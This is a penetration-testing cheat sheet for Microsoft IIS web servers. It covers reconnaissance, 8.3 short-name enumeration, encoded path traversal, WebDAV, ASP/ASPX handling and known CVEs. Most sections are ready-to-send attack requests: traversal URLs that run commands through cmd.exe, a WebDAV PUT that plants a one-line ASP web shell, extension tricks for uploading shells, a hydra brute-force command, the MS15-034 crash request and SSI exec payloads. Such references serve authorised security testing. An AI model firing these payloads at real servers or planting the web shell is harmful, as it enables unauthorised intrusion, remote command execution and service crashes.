# IIS (Internet Information Services) Security Testing

## Overview
Security testing for Microsoft IIS web server including path traversal, authentication bypass, and configuration vulnerabilities.

## Reconnaissance
```
# IIS detection
curl -I https://target.com
# Server: Microsoft-IIS/10.0
# X-Powered-By: ASP.NET
# X-AspNet-Version: 4.x

# Version specific vulnerabilities
IIS 6.0 → Windows Server 2003 (very old, many CVEs)
IIS 7.x → Windows Server 2008
IIS 8.x → Windows Server 2012
IIS 10.0 → Windows Server 2016/2019

# WebDAV detection
OPTIONS / HTTP/1.1 → check Allow header for PUT, PROPFIND, etc.
```

## Path Traversal & Short Name (8.3) Enumeration
```
# IIS Tilde (~) vulnerability - enumerate short filenames
# Works on older IIS (<=8.5) or misconfigured newer
GET /a~1 HTTP/1.1  → 404 if no file, 400 if file exists starting with 'a'
GET /ab~1 HTTP/1.1

# Tool: IIS Short Name Scanner
java -jar iis_shortname_scanner.jar 2 20 https://target.com/

# Discover hidden files/directories:
# If /secret_config_file.xml exists → /secre~1.xml gives 400
```

## Unicode/Double Encoding Path Traversal
```
# IIS 5.x/6.x specific
# Unicode traversal (CVE-2001-0333)
GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir
GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir
GET /%c0%ae%c0%ae/%c0%ae%c0%ae/winnt/system32/cmd.exe

# Double encoding
GET /..%255c..%255c..%255cwinnt%255csystem32%255ccmd.exe

# Modern IIS: less likely but test:
..%2F..%2F..%2Fwindows/win.ini
..%5c..%5c..%5cwindows/win.ini
```

## Authentication Bypass

### NTLM Authentication Bypass
```
# Test for NTLM authentication
curl -I https://target.com/ 
# WWW-Authenticate: NTLM or Negotiate

# Relay attacks (in network context)
# NTLM reflection: CVE-2019-1040

# Test basic auth brute force
hydra -L users.txt -P passwords.txt https://target.com http-get /admin
```

### WebDAV Authentication Bypass
```
# If WebDAV enabled:
OPTIONS /webdav/ HTTP/1.1
# Check: PROPFIND, PUT, DELETE in Allow header

# Unauthenticated file write:
PUT /shell.asp HTTP/1.1
Content-Length: XX
<%eval request("cmd")%>

# Or MOVE existing file:
COPY /robots.txt HTTP/1.1
Destination: /shell.asp
```

## ASP/ASPX Vulnerabilities
```
# File extension bypass for code execution
shell.asp → shell.asp;.jpg → shell.asp:.jpg (NTFS alternate data stream)
shell.aspx → shell.aspx.
shell.cer, shell.asa (alternative script extensions IIS may execute)

# ViewState without MAC → deserialization
# See deserialization.md

# ASP classic → shell upload if webshell allowed
# ASPX trace enabled: /?trace.axd or /trace.axd
GET /trace.axd → .NET trace information

# Elmah.axd (error log)
GET /elmah.axd → exposed .NET error logs
```

## IIS Buffer Overflow / Known CVEs
```
# CVE-2021-31166: HTTP Protocol Stack RCE (IIS 10 on Windows 10)
# CVE-2017-7269: WebDAV RCE in IIS 6.0 (EternalBlue adjacent)
# CVE-2015-1635: HTTP.sys RCE (MS15-034) — Range header overflow

# MS15-034 test:
GET / HTTP/1.1
Host: target.com
Range: bytes=0-18446744073709551615
# If "Requested Range Not Satisfiable" → patched
# If crash/different response → vulnerable
```

## Sensitive File Exposure
```
# IIS default files
/iisstart.htm, /welcome.png
/aspnet_client/
/web.config → ASP.NET configuration (should be blocked)

# Backup files IIS might expose
/web.config.bak, /web.config~, /.web.config

# Error pages with version info
# Disabled custom error pages → detailed IIS errors
```

## IIS Handler Mapping Attacks
```
# Some file extensions handled by CGI/scripts
# .shtml → Server-Side Includes
# .asp, .aspx, .ashx, .asmx, .axd → ASP.NET

# Test if old handlers enabled:
/file.shtm, /file.stm → Server-Side Includes
<!--#exec cmd="dir"-->
<!--#include file="c:\boot.ini"-->
```

## Testing Methodology
1. Identify IIS version via headers
2. Test tilde enumeration (8.3 short names)
3. Test WebDAV (OPTIONS request)
4. Check for exposed .NET files (trace.axd, elmah.axd)
5. Test path traversal via encoding
6. Check web.config accessibility
7. Test for known CVEs based on version
8. Test authentication endpoints (NTLM, forms)
9. Test file upload restrictions

## Tools
- `IIS Short Name Scanner`
- `nuclei -t iis/` templates
- `nikto` for common misconfigurations
- Burp Suite for manual testing
